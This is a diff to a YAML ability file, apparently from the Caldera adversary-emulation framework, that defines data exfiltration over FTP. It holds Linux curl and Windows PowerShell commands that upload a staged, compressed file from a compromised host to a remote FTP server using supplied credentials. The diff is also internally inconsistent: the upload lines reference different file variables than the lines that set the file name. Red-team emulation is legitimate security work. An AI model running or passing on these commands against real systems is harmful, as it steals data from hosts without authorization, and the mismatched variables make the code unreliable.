@@ -11,22 +11,22 @@
     linux:
       sh:
         command: |
-          LocalFile='#{host.dir.compress}';
+          LocalFile='#{file.staged_at}';
           RemoteName="$(date '+%Y%m%d%H%M%S')-exfil-#{paw}-$(basename $LocalFile)";
-          curl -T #{host.dir.compress} ftp://#{ftp.server.address}/$RemoteName --user #{ftp.user.name}:'#{ftp.user.password}'
+          curl -T #{host.dir.compress} ftp://#{ftp.server.address}/$RemoteName --user #{custom.ftp_username}:'#{custom.ftp_password}'
     windows:
       psh:
         command: |
-          $SourceFile = (Get-Item #{host.dir.compress});
+          $SourceFile = (Get-Item #{file.staged_at});
           $RemoteName = "$(Get-Date -Format yyyymmddhhmmss)-exfil-#{paw}-$($SourceFile.name)";
           $ftp = [System.Net.FtpWebRequest]::Create("ftp://#{ftp.server.address}/$RemoteName");
           $ftp = [System.Net.FTPWebRequest]$ftp;
           $ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile;
-          $ftp.Credentials = New-Object System.Net.NetworkCredential("#{ftp.user.name}", "#{ftp.user.password}");
+          $ftp.Credentials = New-Object System.Net.NetworkCredential("#{custom.ftp_username}", "#{custom.ftp_password}");
           $ftp.UseBinary = $true;
           $ftp.UsePassive = $true;
 
-          $content = [System.IO.File]::ReadAllBytes("#{host.dir.compress}");
+          $content = [System.IO.File]::ReadAllBytes("#{file.path}");
           $ftp.ContentLength = $content.Length;
           $requestStream = $ftp.GetRequestStream();
           $requestStream.Write($content, 0, $content.Length);
@@ -35,4 +35,7 @@
           $requestStream.Dispose();
   requirements:
     - plugins.stockpile.app.requirements.paw_provenance:
-        - source: host.dir.compress
+        - source: file.staged_at
+    - plugins.stockpile.app.requirements.basic:
+      - source: file.staged_at
+        edge: is_compressed
